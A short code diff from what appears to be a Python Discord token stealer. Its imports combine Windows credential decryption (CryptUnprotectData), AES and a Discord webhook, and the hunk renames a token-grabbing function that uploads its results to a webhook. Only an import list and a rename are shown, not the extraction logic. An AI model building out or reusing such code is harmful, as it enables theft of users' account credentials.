@@ -8,7 +8,7 @@ from Crypto.Cipher import AES
 from discord import Embed, SyncWebhook
 from win32crypt import CryptUnprotectData
 
-def get_token(webhook: str) -> None:
+def token(webhook: str) -> None:
     # 토큰 얻는 코드
     upload(webhook).upload()
 
